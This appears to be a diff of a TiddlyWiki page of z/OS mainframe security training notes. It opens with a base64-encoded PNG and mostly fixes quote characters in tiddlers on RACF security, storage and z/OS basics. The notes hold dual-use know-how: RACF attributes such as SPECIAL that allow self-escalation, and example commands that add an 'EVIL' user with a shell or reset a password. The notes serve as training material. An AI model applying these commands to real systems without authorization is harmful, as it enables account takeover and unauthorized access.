 <pre>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</pre>
 </div>
-<div created="20181013024530515" modified="20181105231038990" tags="" title="Security" type="text/vnd.tiddlywiki">
+<div created="20181013024530515" modified="20181106000714923" tags="" title="Security" type="text/vnd.tiddlywiki">
 <pre>! ''External Security Manager (ESM)''
 * For every thing security related z/OS makes a security check
 ** e.g. accessing datasets, opening a port &lt; 1024, running commands, etc
@@ -10200,7 +10200,7 @@ SRCHFOR  'PASSWORD='
 ** A user can have access to Unix (OMVS) with an OMVS segment but not have a TSO segment, thus not being able to use TSO
 * Command reference: https://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.icha400/listusr.htm
 * Attributes
-** ''SPECIAL'' Access to any/all RACF commands. Not ‘root’ but ability to give yourself ‘root’
+** ''SPECIAL'' Access to any/all RACF commands. Not root but ability to give yourself root
 ** ''OPERATIONS'' Access any dataset regardless of dataset rule
 ** ''AUDIT'' View any RACF rule/profile
 ** ''PROTECTED'' Accounts with this attribute are similar to locked accounts except:
@@ -10265,9 +10265,9 @@ SRCHFOR  'PASSWORD='
 ** e.g. `LD EVIL.LABS GEN`
 * `RVARY` lists RACF database dataset name (primary and backup)
 * `ALTUSER` alters a user profile
-** e.g. `ALTUSER EVIL96 PASSWORD(‘BADPASS’)`
+** e.g. `ALTUSER EVIL96 PASSWORD('BADPASS')`
 * `ADDUSER` adds a new user
-** e.g. `ADDUSER EVIL200 NAME(‘Evil Mainframe 200’) PASSWORD(‘INFOSEC’) OMVS(UID(1337) HOME(/u/i) PROGRAM(/bin/sh))`
+** e.g. `ADDUSER EVIL200 NAME('Evil Mainframe 200') PASSWORD('INFOSEC') OMVS(UID(1337) HOME(/u/i) PROGRAM(/bin/sh))`
 * `DELUSER` deletes a user profile (but not any of their datasets)
 ** e.g. `DELUSER EVIL200`
 * `CONNECT`/`REMOVE` Adds/removes users to/from groups (same syntax)
@@ -10304,14 +10304,14 @@ SRCHFOR  'PASSWORD='
 ,,Copyright EM Training LLC,,
 </pre>
 </div>
-<div created="20181013023447689" modified="20181105221907286" tags="" title="Storage" type="text/vnd.tiddlywiki">
+<div created="20181013023447689" modified="20181106001127148" tags="" title="Storage" type="text/vnd.tiddlywiki">
 <pre>!! ''Storage is Another Name for Memory''
 * Every task gets a map of memory to virtual memory
 * Initially S/360 was 24 bit – 16MB
 * Then 31 bit – 2 GB
 * Then 64 bit – 16 EB
-* The “line” 16 MB
-* The “bar” 2 GB
+* The ''line'' 16 MB
+* The ''bar'' 2 GB
 
 !! ''What is in memory?''
 * ''CSA - Common service area'' This area contains pageable and fixed data areas that are addressable by all active virtual storage address spaces.
@@ -10507,7 +10507,7 @@ If you do decide to use this document to take notes and save your changes note t
 
 ,,Copyright EM Training LLC,,</pre>
 </div>
-<div created="20181012215637973" modified="20181105192826153" tags="" title="z/OS Basics" type="text/vnd.tiddlywiki">
+<div created="20181012215637973" modified="20181106000456472" tags="" title="z/OS Basics" type="text/vnd.tiddlywiki">
 <pre>!! ''Basics''
 * Harddrives are called Direct Access Storage Devices or ''DASD''
 * Hosts/servers are called ''LPAR''s
@@ -10558,7 +10558,7 @@ If you do decide to use this document to take notes and save your changes note t
 * No access to CICS
 * Access to TSO through `/bin/tso` or `/bin/tsocmd` commands
 
-!!! ''Network Job Entry (NJE)'''
+!!! ''Network Job Entry (NJE)''
 * Allows for the submission of jobs to other ''NODES'' on the mainframe network
 * More info: https://www.alchemistowl.org/pocorgtfo/pocorgtfo12.pdf
 
@@ -10607,7 +10607,7 @@ If you do decide to use this document to take notes and save your changes note t
 ** `OGET`/`OPUT` either gets a file from Unix and puts it in a dataset or puts a dataset in to a Unix file
 * Access a shell prompt with the TSO command `OMVS`
 ** Run TSO commands inside of Unix with `/bin/tsocmd` or `/bin/tso`
-** Copy a dataset to Unix: `cp ”//’EVIL.PHILEZ’” /tmp/philez`
+** Copy a dataset to Unix: `cp &quot;//'EVIL.PHILEZ'&quot; /tmp/philez`
 
 ,,Copyright EM Training LLC,,
 </pre>
